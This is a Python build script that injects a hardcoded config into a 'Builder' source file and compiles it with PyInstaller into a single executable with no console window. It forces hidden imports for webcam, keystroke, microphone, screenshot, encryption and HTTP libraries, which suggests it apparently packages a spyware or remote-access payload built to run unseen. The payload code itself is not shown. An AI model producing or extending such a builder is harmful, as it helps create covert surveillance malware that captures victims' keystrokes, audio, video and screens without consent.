import os
import sys
import subprocess

EXCLUDE_MODULES = [
    "dnspython", "whois", "scapy", "matplotlib", "colorama", "pyfiglet",
    "customtkinter", "Flask", "pydub", "urllib3", "tqdm",
    "scikit-learn", "pandas", "seaborn", "joblib",
    "torch", "tensorflow", "sympy", "scipy",
]

HIDDEN_IMPORTS = [
    "cv2",
    "pynput",
    "requests",
    "PIL",
    "sounddevice",
    "numpy",
    "wavio",
    "pyautogui",
    "cryptography",
    "urllib3",
]

def build_exe(builder_path, hardcode_config, exe_name="BuilderExe"):
    import shutil

    base_dir = os.path.dirname(builder_path)
    temp_path = os.path.join(base_dir, "Builder_temp.py")

    with open(builder_path, "r", encoding="utf-8") as f:
        code = f.read()

    hardcoded_code = f"HARDCODE_CONFIG = {repr(hardcode_config)}\n"
    code = code.replace("HARDCODE_CONFIG = {}", hardcoded_code)

    with open(temp_path, "w", encoding="utf-8") as f:
        f.write(code)

    print("[*] Building EXE with PyInstaller...")

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        f"--name={exe_name}"
    ]

    for mod in HIDDEN_IMPORTS:
        cmd.append(f"--hidden-import={mod}")

    for mod in EXCLUDE_MODULES:
        cmd.append(f"--exclude-module={mod}")

    cmd.append(temp_path)

    subprocess.run(cmd)

    os.remove(temp_path)
    print(f"[+] EXE built successfully in '{os.path.join(base_dir, 'dist')}'")
